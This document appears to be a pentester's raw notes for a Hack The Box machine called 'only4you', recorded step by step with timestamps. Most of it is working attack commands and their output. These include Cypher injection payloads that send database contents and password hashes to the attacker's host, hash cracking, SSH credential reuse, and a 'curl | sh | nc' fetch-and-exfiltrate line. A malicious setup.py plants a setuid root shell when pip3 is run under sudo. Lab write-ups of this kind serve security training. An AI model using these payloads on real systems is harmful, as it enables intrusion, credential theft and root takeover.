+GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1
+User-Agent: NeoLoadCSV_Java/17.0.6+10-Ubuntu-0ubuntu120.04.1
+
+2023-04-25 21:33:09 CDT -- 
+//Get Running query
+' OR 1=1 WITH 1 as a CALL dbms.listQueries() YIELD query LOAD CSV FROM 'http://10.10.16.7:8000/?q='+ query as l RETURN 0 as _0 //
+//FAIL
+
+2023-04-25 21:46:08 CDT -- 
+//Get Labels
+' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.7:8000/?l='+label as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 21:47:37] "GET /?l=user HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 21:47:38] "GET /?l=employee HTTP/1.1" 200 -
+
+2023-04-25 22:04:26 CDT -- 
+//Get Property Keys
+' OR 1=1 WITH 1 as a CALL db.propertyKeys() YIELD propertyKey LOAD CSV FROM 'http://10.10.16.7:8000/?pk='+propertyKey as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 22:04:34] "GET /?pk=password HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:35] "GET /?pk=name HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:35] "GET /?pk=country HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:35] "GET /?pk=city HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:36] "GET /?pk=salary HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:36] "GET /?pk=username HTTP/1.1" 200 -
+
+2023-04-25 22:16:57 CDT -- 
+//Get Properties of a Key
+// User Labels
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.7:8000/?user='+ p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 22:12:00] "GET /?user=password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:12:01] "GET /?user=username=admin HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:12:01] "GET /?user=password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:12:02] "GET /?user=username=john HTTP/1.1" 200 -
+
+//CREDS
+admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+
+2023-04-25 22:17:00 CDT -- 
+#[*] EXTRA
+// Employee Labels
+' OR 1=1 WITH 1 as a MATCH (f:employee) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.7:8000/?employee='+ p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 22:15:14] "GET /?employee=city=London HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:15:15] "GET /?employee=salary=$36,738 HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:15:15] code 400, message Bad request syntax ('GET /?employee=name=Sarah Jhonson HTTP/1.1')
+10.129.206.45 - - [25/Apr/2023 22:15:15] "GET /?employee=name=Sarah Jhonson HTTP/1.1" 400 -
+
+//INFO
+Sarah Jhonson:London:$36,738
+//NOTE: Sarah is not doing that well in London as Product Manager
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// CRAck Hashes
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+echo 'admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918' > user.hash
+echo 'john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6' >> user.hash
+
+//admin
+hash-identifier 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+echo '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918' | hashid -j
+[+] SHA-256 [JtR Format: raw-sha256]
+
+
+//john
+hash-identifier a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+echo 'a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6' | hashid -j
+[+] SHA-256 [JtR Format: raw-sha256]
+
+sudo gunzip -d /usr/share/wordlists/rockyou.txt.gz
+
+2023-04-25 22:28:25 CDT -- 
+john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt user.hash 
+
+admin            (admin)     
+ThisIs4You       (john)
+
+//john is the only one with an account on box based on passwd
+// Lets try cred reuse with SSH
+
+//NOTE: John's creds work on http://127.0.0.1:3000/ Gogs but he has only a "Test" repo with nothing in it.
+//NOTE: John's creds DO NOT work on http://127.0.0.1:7474/ Neo4j site
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// SSH Access
+// john:ThisIs4You
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-25 22:36:01 CDT -- 
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" john@only4you.htb
+// Password:  ThisIs4You
+
+2023-04-25 22:36:36 CDT -- 
+id
+uid=1000(john) gid=1000(john) groups=1000(john)
+//SUCCESS
+
+ls -l
+total 4
+-rw-r----- 1 root john 33 Apr 26 01:31 user.txt
+
+cat user.txt 
+// c506c2fb6285dfa447ed5140ad295ab4
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (john)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-25 22:37:07 CDT -- 
+sudo -ll
+Matching Defaults entries for john on only4you:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on only4you:
+
+Sudoers entry:
+    RunAsUsers: root
+    Options: !authenticate
+    Commands:
+        /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+
+//NOTE: For john env_reset and a /usr/bin/pip3 download from the Gogs website is available
+//Need to create a priv esc and upload it to Gogs so pip3 can install it
+//Going to run linpeas first to get a better idea or possibly find another route
+
+cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//linpeas is still downloaded from previous run
+
+// upload linpeas to target
+mktemp -d
+/tmp/tmp.yuJ5yAhICy
+cd /tmp/tmp.yuJ5yAhICy
+
+2023-04-25 23:00:10 CDT -- 
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 8000
+  // kali term2
+nc -lvnp 443 | tee linpeas_john.out
+  // target
+curl 10.10.16.7:8000/linpeas.sh | sh | nc 10.10.16.7 443
+
+less -r linpeas_john.out
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ Executing Linux Exploit Suggester
+[+] [CVE-2022-2586] nft_object UAF
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+//Mostly the same as the linpeas out of www-data
+//Need to figure out how to do a pip3 module privesc
+
+mkdir fakepip_privesc
+cd fakepip_privesc
+
+// FakePip exploit
+// /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import os
+
+def RunCommand():
+    os.system("mkdir -p /tmp/xGh05t")
+    os.system("cp /bin/bash /tmp/xGh05t")
+    os.system("chmod +sx /tmp/xGh05t/bash")
+
+class RunInstallCommand(install):
+    def run(self):
+        RunCommand()
+        install.run(self)
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
+
+setup(
+    name = "xGh05t_fakePip",
+    description='This will exploit a sudoer able to /usr/bin/pip3 install *',
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info' : RunEggInfoCommand,
+        }
+    )
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+pip3 install setuptools
+pip3 install build
+
+2023-04-26 00:47:49 CDT -- 
+python3 -m build
+
+//Successfully built xGh05t_fakePip-0.0.0.tar.gz and xGh05t_fakePip-0.0.0-py3-none-any.whl
+
+tar -tzvf dist/xGh05t_fakePip-0.0.0.tar.gz
+drwxr-xr-x kali/kali         0 2023-04-26 01:13 xGh05t_fakePip-0.0.0/
+-rw-r--r-- kali/kali       126 2023-04-26 01:13 xGh05t_fakePip-0.0.0/PKG-INFO
+-rw-r--r-- kali/kali        38 2023-04-26 01:13 xGh05t_fakePip-0.0.0/setup.cfg
+-rw-r--r-- kali/kali       752 2023-04-26 01:13 xGh05t_fakePip-0.0.0/setup.py
+drwxr-xr-x kali/kali         0 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/
+-rw-r--r-- kali/kali       126 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/PKG-INFO
+-rw-r--r-- kali/kali       160 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/SOURCES.txt
+-rw-r--r-- kali/kali         1 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/dependency_links.txt
+-rw-r--r-- kali/kali         1 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/top_level.txt
+
+//UPload xGh05t_fakePip-0.0.0.tar.gz in the Test repo on Gogs
+//Creds:
+	John:ThisIs4You
+//Make Repo public to download and run
+
+http://127.0.0.1:3000/john/Test/raw/master/xGh05t_fakePip-0.0.0.tar.gz
+
+//Run sudo command to install payload
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/xGh05t_fakePip-0.0.0.tar.gz
+
+ls -lah /tmp/xGh05t/bash 
+-rwsr-sr-x 1 root root 1.2M Apr 26 06:14 /tmp/xGh05t/bash
+
+2023-04-26 01:18:03 CDT -- 
+/tmp/xGh05t/bash -p
+
+id
+uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)
+
+ls -lah /root/root.txt 
+-rw-r----- 1 root root 33 Apr 26 01:31 /root/root.txt
+
+cat /root/root.txt
+// 6c144633876c767c180fd2d9ee893e0b
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-26 01:37:15 CDT -- COMPLETE
+
